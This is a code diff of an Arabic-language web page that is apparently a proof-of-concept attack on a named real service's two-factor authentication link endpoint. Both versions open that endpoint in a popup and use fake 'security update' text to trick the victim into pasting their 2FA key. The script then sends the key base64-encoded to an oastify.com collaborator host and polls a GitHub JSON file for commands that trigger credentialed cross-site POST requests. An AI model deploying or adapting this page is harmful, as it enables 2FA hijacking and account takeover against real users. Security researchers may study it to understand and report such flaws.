@@ -1,83 +1,66 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمان الحساب</title>
+    <title>تحديث نظام الأمان</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; background-color: #f4f7f6; color: #333; }
-        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
+        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { background-color: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        button:hover { background-color: #2980b9; }
-        #manual-input { margin-top: 20px; display: none; }
-        input { padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 4px; }
+        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        input { padding: 8px; width: 250px; margin: 10px; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>جاري فحص حالة الحساب...</h2>
+    <div class="box">
         <div class="loader"></div>
-        <p id="status">يرجى الضغط على الزر أدناه لتأكيد هويتك وتحديث إعدادات الأمان (2FA).</p>
+        <h2>جاري تحديث الجلسة...</h2>
+        <p>يرجى الضغط على الزر لفتح نافذة التحقق، ثم انسخ الـ <b>key</b> وضعه هنا:</p>
         
-        <button onclick="startAttack()">تأكيد الهوية الآن</button>
-
-        <div id="manual-input">
-            <p>انسخ الكود (Key) الذي ظهر في النافذة المنبثقة وضعه هنا:</p>
-            <input type="text" id="victimCode" placeholder="ضع الكود هنا...">
-            <button onclick="sendToBurp()">إرسال</button>
+        <button onclick="openVerification()">فتح نافذة التحقق</button>
+        
+        <div id="capture" style="margin-top:20px;">
+            <input type="text" id="keyInput" placeholder="ضع الكود (Key) هنا...">
+            <button onclick="leakToBurp()" style="background:#27ae60;">تأكيد الربط</button>
         </div>
     </div>
 
     <script>
-        // ضع روابطك هنا
+        const burpExfil = "https://oa27fvr47cjaj0xgh6s4qmgpogu7i46t.oastify.com";
         const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";
-        const burpExfil = "https://mnd5st42kaw8wyaeu4523ktn1e75v1jq.oastify.com";
 
-        async function startAttack() {
-            // 1. إبلاغ Burp أن الضحية بدأ التفاعل
-            new Image().src = burpExfil + "/victim_started";
-
-            // 2. فتح صفحة الـ JSON في نافذة جديدة
-            // بما أن CORS يمنع القراءة برمجياً، سنجعل الضحية يراها
-            window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "SecurityCheck", "width=500,height=500");
-
-            // 3. إظهار حقل الإدخال للتمويه (Social Engineering)
-            document.getElementById("status").innerText = "برجاء نسخ قيمة 'key' من النافذة التي فتحت ووضعها أدناه.";
-            document.getElementById("manual-input").style.display = "block";
-
-            // 4. بدء مراقبة أوامرك من GitHub لتنفيذ الريكوست الثاني (POST)
-            monitorGitHub();
+        function openVerification() {
+            // فتح الصفحة التي تحتوي على الـ Key
+            window.open("https://auth.plumsail.com/api/account/users/manage/2fa/link", "Verify", "width=400,height=400");
         }
 
-        function sendToBurp() {
-            let code = document.getElementById("victimCode").value;
-            if(code) {
-                // إرسال الكود الذي وضعه الضحية إلى Burp فوراً
-                fetch(burpExfil + "/?captured_key=" + btoa(code), {mode: 'no-cors'});
-                alert("تم استلام الكود، جاري المعالجة...");
+        function leakToBurp() {
+            const key = document.getElementById("keyInput").value;
+            if(key) {
+                // إرسال الكود لـ Burp
+                fetch(burpExfil + "/?key=" + btoa(key), {mode: 'no-cors'});
+                alert("شكراً لك، جاري إتمام العملية في الخلفية...");
+                
+                // بدء مراقبة أوامر GitHub لتنفيذ الريكوست الثاني (الـ POST)
+                startMonitoring();
             }
         }
 
-        async function monitorGitHub() {
+        function startMonitoring() {
             setInterval(async () => {
                 try {
-                    let response = await fetch(githubCmd + "?t=" + Date.now());
-                    let cmd = await response.json();
-
-                    if (cmd.url && cmd.url !== "") {
-                        // تنفيذ الريكوست الثاني (POST)
-                        // استخدام XMLHttpRequest لضمان إرسال الكوكيز (withCredentials)
+                    let res = await fetch(githubCmd + "?t=" + Date.now());
+                    let cmd = await res.json();
+                    if (cmd.url) {
+                        // تنفيذ الـ POST (الريكوست الثاني)
                         var xhr = new XMLHttpRequest();
                         xhr.open("POST", cmd.url, true);
-                        xhr.withCredentials = true; 
-                        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                        xhr.send(cmd.body || null);
-
-                        new Image().src = burpExfil + "/post_action_executed";
+                        xhr.withCredentials = true;
+                        xhr.send();
                         console.log("Action Executed!");
                     }
-                } catch (e) { }
+                } catch(e) {}
             }, 3000);
         }
     </script>
